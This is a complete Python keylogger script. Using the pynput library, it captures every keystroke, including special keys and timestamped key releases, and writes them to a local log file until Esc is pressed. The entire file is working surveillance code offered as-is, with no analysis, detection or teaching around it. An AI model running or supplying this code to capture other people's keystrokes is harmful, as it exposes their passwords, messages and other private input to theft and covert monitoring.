from pynput import keyboard
import os
import datetime

# Define the log file name
logfile = "keyfile.txt"

# Function to ensure the log file exists
def ensure_logfile_exists():
    if not os.path.exists(logfile):
        with open(logfile, 'w') as logkey:
            logkey.write("Keylogger log file created\n")
            logkey.write(f"Log start time: {datetime.datetime.now()}\n")
            logkey.write("---\n")

# Function to handle key press events
def keyPressed(key):
    with open(logfile, 'a') as logkey:
        try:
            # If the key is a printable character, write it directly
            logkey.write(key.char)
        except AttributeError:
            # If the key is a special key (e.g., Ctrl, Alt, etc.), write it in square brackets
            logkey.write(f'[{key}]')

# Function to handle key release events
def keyReleased(key):
    with open(logfile, 'a') as logkey:
        # Log the key release event with a timestamp
        logkey.write(f'[{key}] released at {datetime.datetime.now()}\n')
    if key == keyboard.Key.esc:
        # Stop listener if the Esc key is released
        return False

# Function to handle errors and exceptions
def handle_error(error):
    with open(logfile, 'a') as logkey:
        logkey.write(f"Error occurred: {error}\n")

# Main function to set up the key listener
def main():
    ensure_logfile_exists()
    with open(logfile, 'a') as logkey:
        logkey.write("\n--- Starting Keylogger ---\n")
        logkey.write(f"Start time: {datetime.datetime.now()}\n")
        logkey.write("---\n")
    
    try:
        with keyboard.Listener(on_press=keyPressed, on_release=keyReleased) as listener:
            listener.join()
    except Exception as e:
        handle_error(e)

if __name__ == "__main__":
    main()
